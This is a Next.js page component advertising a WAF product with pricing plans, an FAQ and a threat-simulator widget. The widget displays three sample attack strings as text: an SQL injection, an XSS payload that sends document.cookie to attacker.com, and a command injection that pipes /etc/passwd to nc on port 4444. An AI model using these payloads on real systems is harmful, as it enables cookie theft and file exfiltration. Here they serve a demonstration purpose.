'use client';

import React, { useState, useEffect } from 'react';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { 
  Shield, ShieldCheck, ShieldAlert, Lock, Zap, CheckCircle2, ArrowRight, 
  Cpu, HardDrive, Activity, RefreshCw, ShoppingCart, Key,
  ChevronDown, ChevronUp, Award, BarChart3, Globe, AlertTriangle,
  Terminal, Sliders, Check, Copy, Sparkles, Radio, Bug, FileText
} from 'lucide-react';
import { useCartStore } from '@/src/store/useCartStore';
import { api } from '@/src/lib/api';

export default function SecurityWafServicePage() {
  const router = useRouter();
  const addItem = useCartStore((state) => state.addItem);
  const [billingCycle, setBillingCycle] = useState<'monthly' | 'yearly'>('yearly');
  const [dbPlans, setDbPlans] = useState<any[]>([]);
  const [openFaq, setOpenFaq] = useState<number | null>(null);

  // WAF Threat Simulator state
  const [testPayload, setTestPayload] = useState<string>("SELECT * FROM users WHERE id = '1' OR '1'='1' --");
  const [attackType, setAttackType] = useState<'sqli' | 'xss' | 'rce'>('sqli');
  const [isScanning, setIsScanning] = useState(false);

  useEffect(() => {
    async function loadPlans() {
      try {
        const res = await api.get('/categories/security-waf/plans');
        if (res.data?.plans?.length) {
          setDbPlans(res.data.plans);
        }
      } catch (err) {
        console.warn('Could not load security plans from API', err);
      }
    }
    loadPlans();
  }, []);

  const handlePayloadSelect = (type: 'sqli' | 'xss' | 'rce') => {
    setAttackType(type);
    setIsScanning(true);
    if (type === 'sqli') {
      setTestPayload("SELECT * FROM users WHERE id = '1' OR '1'='1' --");
    } else if (type === 'xss') {
      setTestPayload("<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>");
    } else {
      setTestPayload("; cat /etc/passwd | nc 192.168.1.100 4444");
    }
    setTimeout(() => setIsScanning(false), 300);
  };

  const defaultPlans = [
    {
      id: 'waf-basic',
      name: 'WAF Shield Starter',
      tier: 'Blog & SME Web Applications',
      workload: 'Website Doanh nghiệp, Landing Page & Blog WordPress / Next.js',
      monthlyPrice: 99000,
      yearlyPrice: 79000 * 12,
      domains: '1 Website / Domain',
      bandwidth: '500 GB Clean Bandwidth',
      ruleset: 'OWASP Core Rule Set 3.3',
      ddos: '10 Gbps Layer 7 Anti-DDoS',
      features: [
        'Tường lửa ứng dụng WAF lọc tấn công SQLi, XSS, CSRF',
        'Ẩn địa chỉ IP máy chủ gốc (Origin IP Cloaking)',
        'Tự động cấp phát chứng chỉ SSL HTTPS Let\'s Encrypt',
        'Bảng theo dõi và thống kê lưu lượng tấn công thời gian thực',
        'Kích hoạt dễ dàng qua thay đổi bản ghi CNAME / DNS trong 2 phút'
      ],
      popular: false,
    },
    {
      id: 'waf-pro',
      name: 'WAF AI Pro Shield',
      tier: 'E-Commerce & High-Traffic APIs',
      workload: 'Sàn thương mại điện tử, Cổng thanh toán, Mobile App Backend & SaaS',
      monthlyPrice: 299000,
      yearlyPrice: 239000 * 12,
      domains: '5 Websites / Domains',
      bandwidth: '2 TB Clean Bandwidth',
      ruleset: 'AI Machine Learning + Zero-Day Engine',
      ddos: '100 Gbps Layer 7 Anti-DDoS',
      features: [
        'Trí tuệ nhân tạo AI phân tích hành vi & nhận diện mã độc Zero-Day',
        'Chống tấn công từ chối dịch vụ Layer 7 (HTTP Flood, CC Attack)',
        'Tường lửa lọc Botnet, chống cào dữ liệu (Anti-Scraping) tự động',
        'Tính năng Rate Limiting giới hạn tần suất request theo IP/API Key',
        'Tùy chỉnh bộ quy tắc Custom Rules (Regex, Header, Geo-IP Block)',
        'Hỗ trợ kỹ thuật an ninh mạng Level 3 can thiệp 24/7'
      ],
      popular: true,
    },
    {
      id: 'waf-enterprise',
      name: 'WAF Enterprise Defense',
      tier: 'Fintech, Banking & Large Media',
      workload: 'Hệ thống Tài chính, Ngân hàng, Báo điện tử & Cụm Server đa vùng',
      monthlyPrice: 899000,
      yearlyPrice: 719000 * 12,
      domains: 'Không giới hạn Domains',
      bandwidth: '10 TB Clean Bandwidth',
      ruleset: 'Enterprise SOC + Custom WAF Rules',
      ddos: '500 Gbps Dedicated Mitigation',
      features: [
        'Cụm máy chủ Reverse Proxy phân tán Anycast đa điểm tốc độ cao',
        'Đội ngũ kỹ sư an ninh mạng SOC giám sát 24/7/365',
        'Tích hợp cảnh báo thời gian thực qua Telegram, Slack, Webhook',
        'Báo cáo kiểm định bảo mật định kỳ tuân thủ PCI-DSS & ISO 27001',
        'Tùy chỉnh trang báo lỗi 403 / CAPTCHA nhận diện thương hiệu riêng',
        'Ký kết thỏa thuận bảo mật NDA và cam kết SLA 99.99%'
      ],
      popular: false,
    },
  ];

  const plans = defaultPlans.map((dp, idx) => {
    const matchingDb = dbPlans[idx];
    return {
      ...dp,
      id: matchingDb?.id || dp.id,
      monthlyPrice: matchingDb?.monthlyPrice || dp.monthlyPrice,
      yearlyPrice: matchingDb?.yearlyPrice || dp.yearlyPrice,
    };
  });

  const handleOrder = async (plan: typeof plans[0]) => {
    const cycleMonths = billingCycle === 'yearly' ? 12 : 1;
    const price = billingCycle === 'yearly' ? plan.yearlyPrice : plan.monthlyPrice;
    await addItem(plan.id, cycleMonths, false, {
      name: `${plan.name} - ${billingCycle === 'yearly' ? '12 Tháng' : '1 Tháng'}`,
      price: price,
      billingCycle: cycleMonths,
      type: 'vps',
      details: `${plan.domains} • ${plan.bandwidth}`
    });
    router.push('/cart');
  };

  const faqs = [
    {
      q: 'WAF Shield bảo vệ ứng dụng của tôi như thế nào khi chưa kịp vá lỗ hổng mã nguồn?',
      a: 'WAF hoạt động như một lớp màng lọc Reverse Proxy đứng trước máy chủ của bạn. Mọi request độc hại chứa mã khai thác (SQL Injection, XSS, Path Traversal, Log4j, Remote Code Execution) sẽ bị phát hiện và chặn đứng (HTTP 403 Forbidden) ngay tại tầng biên WAF mà không bao giờ chạm tới mã nguồn máy chủ gốc.'
    },
    {
      q: 'Việc định tuyến qua WAF có làm tăng độ trễ truy cập trang web không?',
      a: 'Hoàn toàn không đáng kể. Cụm Proxy WAF của SEN CloudHost được đặt trực tiếp tại các trung tâm dữ liệu Viettel IDC & VNPT với hạ tầng vi xử lý hiệu năng cao, thời gian phân tích gói tin chỉ mất từ 0.3ms - 0.5ms (dưới nửa phần nghìn giây).'
    },
    {
      q: 'Tôi có cần phải cài đặt phần mềm gì lên máy chủ của mình không?',
      a: 'Không cần cài đặt bất kỳ phần mềm nào! Bạn chỉ cần đổi bản ghi CNAME hoặc bản ghi A của tên miền trỏ về địa chỉ IP của WAF Shield. Toàn bộ tiến trình thiết lập chỉ mất khoảng 2 phút.'
    },
    {
      q: 'Hệ thống có ngăn chặn được bot cào dữ liệu (Web Scraping) và spam form không?',
      a: 'Có. WAF tích hợp AI nhận diện hành vi bot tự động (Behavioral Analysis), chặn đứng các công cụ cào dữ liệu như Puppeteer, Selenium, Python Requests và yêu cầu xác thực JavaScript Challenge nhẹ nhàng đối với các request nghi vấn.'
    }
  ];

  return (
    <div className="min-h-screen bg-[#090d16] text-slate-100 selection:bg-rose-500 selection:text-white font-sans">
      
      {/* 1. HERO SECTION: WAF THREAT TELEMETRY CONSOLE */}
      <section className="relative pt-16 pb-20 border-b border-slate-800/80 overflow-hidden">
        {/* Technical Grid Blueprint */}
        <div 
          className="absolute inset-0 opacity-[0.06] pointer-events-none" 
          style={{ 
            backgroundImage: `linear-gradient(to right, #f43f5e 1px, transparent 1px), linear-gradient(to bottom, #f43f5e 1px, transparent 1px)`,
            backgroundSize: '40px 40px' 
          }}
        />
        <div className="absolute top-0 right-1/4 w-[600px] h-[300px] bg-rose-600/10 blur-[120px] pointer-events-none" />

        <div className="relative max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          
          {/* Engineering Status Bar */}
          <div className="flex flex-wrap items-center justify-between gap-4 p-3.5 mb-10 rounded-2xl bg-[#0d1424] border border-slate-800 text-xs font-mono">
            <div className="flex items-center gap-3">
              <span className="flex items-center gap-1.5 text-emerald-400 font-bold">
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
                WAF ENGINE: AI ANOMALY DETECTION ACTIVE
              </span>
              <span className="text-slate-600 hidden sm:inline">|</span>
              <span className="text-slate-300 hidden sm:inline">
                INSPECTION TIME: <strong className="text-emerald-400 font-mono">&lt; 0.4ms</strong>
              </span>
            </div>

            <div className="flex items-center gap-4 text-slate-400">
              <span>OWASP COVERAGE: <strong className="text-rose-400 font-mono">100% Top 10</strong></span>
              <span>L7 ANTI-DDOS: <strong className="text-white font-mono">100Gbps+ Filter</strong></span>
            </div>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 items-center">
            
            {/* Left Headline */}
            <div className="lg:col-span-7 space-y-6">
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-lg bg-rose-950/60 border border-rose-800/60 text-rose-300 text-xs font-mono">
                <ShieldAlert className="w-3.5 h-3.5 text-rose-400" />
                ENTERPRISE WEB APPLICATION FIREWALL
              </div>

              <h1 className="text-3xl sm:text-5xl lg:text-6xl font-extrabold tracking-tight text-white leading-[1.15]">
                Lá Chắn Bảo Mật Với{' '}
                <span className="text-transparent bg-clip-text bg-gradient-to-r from-rose-400 via-pink-400 to-amber-300 font-mono">
                  AI WAF Shield
                </span>
              </h1>

              <p className="text-slate-300 text-base sm:text-lg leading-relaxed max-w-2xl font-normal">
                Bảo vệ toàn diện website và API backend trước các cuộc tấn công khai thác lỗ hổng OWASP Top 10, 
                botnet cào dữ liệu và tấn công từ chối dịch vụ Layer 7 mà không làm tăng độ trễ truy cập.
              </p>

              {/* Security Standards Badges */}
              <div className="flex flex-wrap items-center gap-3 pt-2">
                <div className="flex items-center gap-2 px-3.5 py-2 rounded-xl bg-[#0f172a] border border-slate-800 text-xs font-mono text-slate-300">
                  <ShieldCheck className="w-4 h-4 text-rose-400" />
                  <span>OWASP Top 10 Ruleset</span>
                </div>
                <div className="flex items-center gap-2 px-3.5 py-2 rounded-xl bg-[#0f172a] border border-slate-800 text-xs font-mono text-slate-300">
                  <Cpu className="w-4 h-4 text-sky-400" />
                  <span>AI Zero-Day Heuristics</span>
                </div>
                <div className="flex items-center gap-2 px-3.5 py-2 rounded-xl bg-[#0f172a] border border-slate-800 text-xs font-mono text-slate-300">
                  <Lock className="w-4 h-4 text-emerald-400" />
                  <span>Origin IP Cloaking</span>
                </div>
              </div>

              {/* Quick Spec Readout */}
              <div className="p-4 rounded-xl bg-[#0c1322] border border-slate-800 text-xs font-mono space-y-2">
                <div className="flex items-center justify-between text-slate-400">
                  <span>Inspection Speed: <strong className="text-white">0.42 ms (No latency impact)</strong></span>
                  <span>Setup: <strong className="text-emerald-400">2-Minute DNS Change</strong></span>
                </div>
                <div className="text-slate-400">
                  Mitigation: <span className="text-slate-300">SQLi, XSS, RCE, SSRF, LFI, Layer 7 HTTP Floods, Bad Bots</span>
                </div>
              </div>

            </div>

            {/* Right Interactive Threat Inspector Simulator */}
            <div className="lg:col-span-5">
              <div className="rounded-2xl bg-[#0b1320] border border-slate-800 p-6 shadow-2xl space-y-5">
                <div className="flex items-center justify-between pb-3 border-b border-slate-800">
                  <div className="flex items-center gap-2">
                    <span className="w-3 h-3 rounded-full bg-rose-500/80" />
                    <span className="w-3 h-3 rounded-full bg-amber-500/80" />
                    <span className="w-3 h-3 rounded-full bg-emerald-500/80" />
                    <span className="text-xs font-mono text-slate-400 ml-2">waf-threat-inspector.sen</span>
                  </div>
                  <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-rose-950/80 text-rose-400 border border-rose-800/60 animate-pulse">
                    THREAT DETECTED
                  </span>
                </div>

                <div className="space-y-3 font-mono text-xs">
                  <div className="flex items-center justify-between">
                    <span className="text-slate-500">// Select Attack Vector Simulation:</span>
                  </div>
                  <div className="flex gap-2">
                    <button
                      onClick={() => handlePayloadSelect('sqli')}
                      className={`px-3 py-1.5 rounded-lg border ${attackType === 'sqli' ? 'bg-rose-950 border-rose-500 text-rose-300 font-bold' : 'bg-slate-900 border-slate-800 text-slate-400'}`}
                    >
                      SQL Injection
                    </button>
                    <button
                      onClick={() => handlePayloadSelect('xss')}
                      className={`px-3 py-1.5 rounded-lg border ${attackType === 'xss' ? 'bg-rose-950 border-rose-500 text-rose-300 font-bold' : 'bg-slate-900 border-slate-800 text-slate-400'}`}
                    >
                      Cross-Site XSS
                    </button>
                    <button
                      onClick={() => handlePayloadSelect('rce')}
                      className={`px-3 py-1.5 rounded-lg border ${attackType === 'rce' ? 'bg-rose-950 border-rose-500 text-rose-300 font-bold' : 'bg-slate-900 border-slate-800 text-slate-400'}`}
                    >
                      Command RCE
                    </button>
                  </div>

                  <div className="p-3.5 rounded-xl bg-[#060a12] border border-slate-800 text-rose-300 break-all select-all font-mono text-[11px] leading-relaxed">
                    {testPayload}
                  </div>
                </div>

                <div className="p-3.5 rounded-xl bg-[#0e1627] border border-slate-800 font-mono text-xs space-y-1.5">
                  <div className="flex justify-between">
                    <span className="text-slate-500">WAF Rule Triggered:</span>
                    <span className="text-rose-400 font-bold">CRS-942100 (SQLi Signature)</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-slate-500">Action Taken:</span>
                    <span className="text-emerald-400 font-bold">HTTP 403 FORBIDDEN (Blocked)</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-slate-500">Origin Server Impact:</span>
                    <span className="text-sky-400">0 Request (Saved CPU)</span>
                  </div>
                </div>

                <div className="pt-2">
                  <a
                    href="#spec-matrix"
                    className="w-full py-3.5 rounded-xl bg-rose-600 hover:bg-rose-500 text-white font-bold text-xs font-mono flex items-center justify-center gap-2 transition-all shadow-lg shadow-rose-600/20"
                  >
                    <span>XEM BẢNG GÓI BẢO MẬT VÀ ĐẶT MUA</span>
                    <ArrowRight className="w-4 h-4" />
                  </a>
                </div>
              </div>
            </div>

          </div>

        </div>
      </section>

      {/* 2. THREE CORE WAF ARCHITECTURE SCHEMATICS */}
      <section className="py-24 bg-[#070b12] border-b border-slate-800">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          
          <div className="text-center max-w-3xl mx-auto mb-16">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-md bg-rose-950 text-rose-400 text-xs font-mono mb-3 border border-rose-800">
              <ShieldCheck className="w-3.5 h-3.5" />
              CYBER DEFENSE ARCHITECTURE
            </div>
            <h2 className="text-3xl sm:text-5xl font-black text-white tracking-tight">
              3 Lớp Phòng Thủ Toàn Diện Của WAF Shield
            </h2>
            <p className="text-slate-400 text-sm sm:text-base mt-3 leading-relaxed font-normal">
              Bảo vệ website và máy chủ ứng dụng trước mọi đòn tấn công mạng tinh vi.
            </p>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
            
            {/* Schematic 1: Reverse Proxy & Origin Cloaking */}
            <div className="p-6 rounded-3xl bg-[#0c1322] border border-slate-800 flex flex-col justify-between space-y-6">
              <div>
                <div className="p-4 rounded-2xl bg-[#060a12] border border-slate-800 mb-6 font-mono text-xs">
                  <div className="text-[10px] text-slate-500 uppercase mb-3 flex items-center justify-between">
                    <span>ORIGIN CLOAKING FLOW</span>
                    <span className="text-emerald-400">100% INVISIBLE</span>
                  </div>
                  <div className="space-y-2 text-slate-300 text-[11px]">
                    <div className="p-2 rounded bg-slate-900 border border-slate-800 flex items-center justify-between">
                      <span>1. Public DNS Query</span>
                      <span className="text-sky-400">WAF Anycast IP</span>
                    </div>
                    <div className="p-2 rounded bg-slate-900 border border-slate-800 flex items-center justify-between">
                      <span>2. Threat Inspection</span>
                      <span className="text-rose-400 font-bold">Filtered &lt; 0.4ms</span>
                    </div>
                    <div className="p-2 rounded bg-slate-900 border border-slate-800 flex items-center justify-between">
                      <span>3. Clean Traffic to Origin</span>
                      <span className="text-emerald-400 font-bold">Origin IP Hidden</span>
                    </div>
                  </div>
                </div>

                <h3 className="text-lg font-bold text-white mb-2">Ẩn Địa Chỉ IP Máy Chủ Gốc (Origin Cloaking)</h3>
                <p className="text-xs text-slate-400 leading-relaxed">
                  Địa chỉ IP thực của máy chủ hosting/VPS được giấu hoàn toàn phía sau lớp khiên WAF. 
                  Kẻ tấn công không thể dò quét cổng hoặc tấn công DDoS trực diện vào máy chủ của bạn.
                </p>
              </div>

              <div className="pt-4 border-t border-slate-800/80 text-xs font-mono text-slate-300 flex items-center justify-between">
                <span>Origin IP Protection:</span>
                <strong className="text-emerald-400">Hoàn Toàn Vô Hình</strong>
              </div>
            </div>

            {/* Schematic 2: AI Zero-Day Threat Filter */}
            <div className="p-6 rounded-3xl bg-[#0c1322] border border-slate-800 flex flex-col justify-between space-y-6">
              <div>
                <div className="p-4 rounded-2xl bg-[#060a12] border border-slate-800 mb-6 font-mono text-xs">
                  <div className="text-[10px] text-slate-500 uppercase mb-3 flex items-center justify-between">
                    <span>AI HEURISTIC SCANNER</span>
                    <span className="text-sky-400">ZERO-DAY DEFENSE</span>
                  </div>
                  <div className="space-y-2 text-slate-300 text-[11px]">
                    <div className="p-2 rounded bg-slate-900 border border-slate-800 flex items-center justify-between">
                      <span>Signature Matching</span>
                      <span className="text-slate-300">10,000+ CRS Rules</span>
                    </div>
                    <div className="p-2 rounded bg-slate-900 border border-slate-800 flex items-center justify-between">
                      <span>Behavioral AI Model</span>
                      <span className="text-sky-400 font-bold">Anomaly Score 99%</span>
                    </div>
                    <div className="p-2 rounded bg-slate-900 border border-slate-800 flex items-center justify-between">
                      <span>Automated Block</span>
                      <span className="text-rose-400 font-bold">Instant Drop 0.4ms</span>
                    </div>
                  </div>
                </div>

                <h3 className="text-lg font-bold text-white mb-2">Trí Tuệ Nhân Tạo Chặn Mã Độc Zero-Day</h3>
                <p className="text-xs text-slate-400 leading-relaxed">
                  Kết hợp giữa chữ ký bảo mật OWASP CRS và mô hình máy học AI nhận diện mẫu hình tấn công bất thường. 
                  Bảo vệ an toàn ứng dụng ngay cả khi lỗ hổng vừa mới xuất hiện và chưa có bản vá từ nhà sản xuất.
                </p>
              </div>

              <div className="pt-4 border-t border-slate-800/80 text-xs font-mono text-slate-300 flex items-center justify-between">
                <span>Threat Coverage:</span>
                <strong className="text-sky-400">SQLi, XSS, RCE, LFI, SSRF</strong>
              </div>
            </div>

            {/* Schematic 3: Rate Limiting & Botnet Shield */}
            <div className="p-6 rounded-3xl bg-[#0c1322] border border-slate-800 flex flex-col justify-between space-y-6">
              <div>
                <div className="p-4 rounded-2xl bg-[#060a12] border border-slate-800 mb-6 font-mono text-xs">
                  <div className="text-[10px] text-slate-500 uppercase mb-3 flex items-center justify-between">
                    <span>RATE LIMIT &amp; BOT SHIELD</span>
                    <span className="text-purple-400">ANTI-SCRAPING</span>
                  </div>
                  <div className="space-y-2 text-slate-300 text-[11px]">
                    <div className="p-2 rounded bg-slate-900 border border-slate-800 flex items-center justify-between">
                      <span>Brute-force / Login Spam</span>
                      <span className="text-rose-400 font-bold">Max 5 req/min</span>
                    </div>
                    <div className="p-2 rounded bg-slate-900 border border-slate-800 flex items-center justify-between">
                      <span>Headless Browser Bot</span>
                      <span className="text-purple-400 font-bold">JS Challenge Block</span>
                    </div>
                    <div className="p-2 rounded bg-slate-900 border border-slate-800 flex items-center justify-between">
                      <span>Legitimate Users</span>
                      <span className="text-emerald-400 font-bold">Seamless 0ms</span>
                    </div>
                  </div>
                </div>

                <h3 className="text-lg font-bold text-white mb-2">Chống Cào Dữ Liệu &amp; Vét Cạn Mật Khẩu</h3>
                <p className="text-xs text-slate-400 leading-relaxed">
                  Thiết lập giới hạn tần suất request thông minh cho từng endpoint nhạy cảm (/login, /api, /checkout). 
                  Tự động phân biệt người dùng thật với botnet tự động giúp máy chủ luôn mượt mà.
                </p>
              </div>

              <div className="pt-4 border-t border-slate-800/80 text-xs font-mono text-slate-300 flex items-center justify-between">
                <span>Bot Mitigation:</span>
                <strong className="text-purple-400">Tự Động Xác Thực JavaScript</strong>
              </div>
            </div>

          </div>

        </div>
      </section>

      {/* 3. TECHNICAL SPECIFICATION MATRIX & PRICING */}
      <section id="spec-matrix" className="py-24 bg-[#090d16] border-b border-slate-800">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          
          <div className="flex flex-col md:flex-row md:items-end justify-between mb-12 gap-6">
            <div>
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-md bg-rose-950 text-rose-400 text-xs font-mono mb-3 border border-rose-800">
                <Sliders className="w-3.5 h-3.5" />
                SECURITY SPEC SHEET
              </div>
              <h2 className="text-2xl sm:text-4xl font-extrabold text-white tracking-tight">
                Bảng So Sánh Các Gói WAF Shield
              </h2>
              <p className="text-slate-400 text-xs sm:text-sm mt-1 font-normal">
                Bảo vệ toàn diện trước mọi nguy cơ an ninh mạng hiện đại.
              </p>
            </div>

            {/* Billing Switch */}
            <div className="inline-flex items-center p-1 rounded-xl bg-[#0c1322] border border-slate-800 font-mono text-xs">
              <button
                onClick={() => setBillingCycle('monthly')}
                className={`px-4 py-2 rounded-lg font-bold transition-all ${
                  billingCycle === 'monthly'
                    ? 'bg-rose-600 text-white shadow'
                    : 'text-slate-400 hover:text-white'
                }`}
              >
                Thanh toán Tháng
              </button>
              <button
                onClick={() => setBillingCycle('yearly')}
                className={`px-4 py-2 rounded-lg font-bold transition-all flex items-center gap-1.5 ${
                  billingCycle === 'yearly'
                    ? 'bg-rose-600 text-white shadow'
                    : 'text-slate-400 hover:text-white'
                }`}
              >
                <span>Thanh toán Năm</span>
                <span className="px-1.5 py-0.2 rounded bg-emerald-500 text-white text-[10px] font-bold">
                  -20%
                </span>
              </button>
            </div>
          </div>

          {/* Matrix Table */}
          <div className="rounded-2xl border border-slate-800 bg-[#0c1322] overflow-hidden shadow-2xl">
            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs font-mono">
                <thead>
                  <tr className="border-b border-slate-800 bg-[#080d17] text-slate-400">
                    <th className="p-5 font-bold uppercase text-[11px] w-1/4">Thông Số Kỹ Thuật</th>
                    {plans.map((p) => {
                      const displayPrice = billingCycle === 'yearly' ? Math.round(p.yearlyPrice / 12) : p.monthlyPrice;
                      return (
                        <th key={p.id} className="p-5 text-white border-l border-slate-800/80 w-1/4">
                          <div className="text-sm font-extrabold text-white">{p.name}</div>
                          <div className="text-[11px] text-slate-400 font-sans font-normal">{p.tier}</div>
                          <div className="text-lg font-black text-rose-400 mt-2">
                            {displayPrice.toLocaleString('vi-VN')} <span className="text-xs font-normal text-slate-400">đ/tháng</span>
                          </div>
                        </th>
                      );
                    })}
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-800/60 text-slate-300">
                  <tr className="hover:bg-slate-900/40">
                    <td className="p-4 font-bold text-slate-400">Số Lượng Domain Bảo Vệ</td>
                    {plans.map((p) => (
                      <td key={p.id} className="p-4 border-l border-slate-800/60 text-white font-bold">{p.domains}</td>
                    ))}
                  </tr>
                  <tr className="hover:bg-slate-900/40">
                    <td className="p-4 font-bold text-slate-400">Băng Thông Sạch (Clean Bandwidth)</td>
                    {plans.map((p) => (
                      <td key={p.id} className="p-4 border-l border-slate-800/60 text-sky-400 font-bold">{p.bandwidth}</td>
                    ))}
                  </tr>
                  <tr className="hover:bg-slate-900/40">
                    <td className="p-4 font-bold text-slate-400">Bộ Quy Tắc An Ninh (Ruleset)</td>
                    {plans.map((p) => (
                      <td key={p.id} className="p-4 border-l border-slate-800/60 text-emerald-400 font-bold">{p.ruleset}</td>
                    ))}
                  </tr>
                  <tr className="hover:bg-slate-900/40">
                    <td className="p-4 font-bold text-slate-400">Lá Chắn Anti-DDoS Layer 7</td>
                    {plans.map((p) => (
                      <td key={p.id} className="p-4 border-l border-slate-800/60 text-rose-400 font-bold">{p.ddos}</td>
                    ))}
                  </tr>
                  <tr className="hover:bg-slate-900/40">
                    <td className="p-4 font-bold text-slate-400">Ẩn Địa Chỉ IP Gốc (Origin Cloaking)</td>
                    {plans.map((p) => (
                      <td key={p.id} className="p-4 border-l border-slate-800/60 text-emerald-400 font-bold">100% Hoạt động</td>
                    ))}
                  </tr>
                  <tr className="hover:bg-slate-900/40">
                    <td className="p-4 font-bold text-slate-400">Thời Gian Kích Hoạt Bảo Vệ</td>
                    {plans.map((p) => (
                      <td key={p.id} className="p-4 border-l border-slate-800/60 text-slate-200">Dưới 2 Phút (Đổi DNS)</td>
                    ))}
                  </tr>
                  <tr className="bg-[#080d17]">
                    <td className="p-5 font-bold text-slate-400">Hành Động Khởi Tạo</td>
                    {plans.map((p) => (
                      <td key={p.id} className="p-5 border-l border-slate-800/60">
                        <button
                          onClick={() => handleOrder(p)}
                          className={`w-full py-3 rounded-xl font-bold text-xs transition-all flex items-center justify-center gap-2 ${
                            p.popular
                              ? 'bg-rose-600 hover:bg-rose-500 text-white shadow-lg shadow-rose-600/30'
                              : 'bg-slate-800 hover:bg-slate-700 text-white'
                          }`}
                        >
                          <span>Kích Hoạt WAF Ngay</span>
                          <ArrowRight className="w-3.5 h-3.5" />
                        </button>
                      </td>
                    ))}
                  </tr>
                </tbody>
              </table>
            </div>
          </div>

        </div>
      </section>

      {/* 4. FAQ SECTION */}
      <section className="py-20 bg-[#090d16] border-b border-slate-800">
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-12">
            <h2 className="text-2xl sm:text-3xl font-extrabold text-white">Câu Hỏi Thường Gặp Về WAF Shield</h2>
            <p className="text-slate-400 text-xs sm:text-sm mt-2 font-mono">SEN CLOUDHOST WAF DEFENSE FAQ</p>
          </div>

          <div className="space-y-3">
            {faqs.map((faq, idx) => (
              <div
                key={idx}
                className="bg-[#0c1322] rounded-2xl border border-slate-800 overflow-hidden transition-all"
              >
                <button
                  onClick={() => setOpenFaq(openFaq === idx ? null : idx)}
                  className="w-full p-5 text-left font-bold text-sm text-white flex items-center justify-between gap-4 hover:text-rose-400 transition-colors"
                >
                  <span>{faq.q}</span>
                  {openFaq === idx ? (
                    <ChevronUp className="w-5 h-5 text-rose-400 shrink-0" />
                  ) : (
                    <ChevronDown className="w-5 h-5 text-slate-500 shrink-0" />
                  )}
                </button>
                {openFaq === idx && (
                  <div className="px-5 pb-5 text-xs text-slate-300 leading-relaxed border-t border-slate-800/60 pt-3 font-normal">
                    {faq.a}
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* 5. CALL TO ACTION */}
      <section className="py-16 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="rounded-3xl bg-gradient-to-r from-[#210c14] via-[#14060b] to-[#210c14] p-8 sm:p-12 border border-rose-600/30 text-center relative overflow-hidden shadow-2xl">
          <div className="relative z-10 max-w-3xl mx-auto space-y-6">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-md bg-rose-950 border border-rose-800 text-rose-400 text-xs font-mono">
              <Zap className="w-3.5 h-3.5" />
              ACTIVATE IN 2 MINUTES
            </div>
            
            <h3 className="text-2xl sm:text-4xl font-extrabold text-white">
              Bảo Vệ Website Khỏi Mọi Nguy Cơ Tấn Công Ngay Hôm Nay
            </h3>
            
            <p className="text-slate-300 text-xs sm:text-base leading-relaxed font-normal">
              Chỉ từ 99.000đ/tháng. Bật lớp khiên bảo mật trong 2 phút và đội ngũ kỹ sư an ninh mạng hỗ trợ cấu hình miễn phí 24/7.
            </p>
            
            <div className="flex flex-wrap items-center justify-center gap-4 pt-2">
              <button
                onClick={() => {
                  const el = document.getElementById('spec-matrix');
                  el?.scrollIntoView({ behavior: 'smooth' });
                }}
                className="px-8 py-3.5 rounded-xl bg-rose-600 hover:bg-rose-500 text-white font-bold text-xs font-mono shadow-xl shadow-rose-600/25 transition-all hover:scale-105"
              >
                Kích Hoạt WAF Ngay
              </button>
              <Link
                href="/contact"
                className="px-8 py-3.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-white font-bold text-xs font-mono border border-slate-700 transition-all"
              >
                Tư Vấn An Ninh Mạng
              </Link>
            </div>
          </div>
        </div>
      </section>

    </div>
  );
}
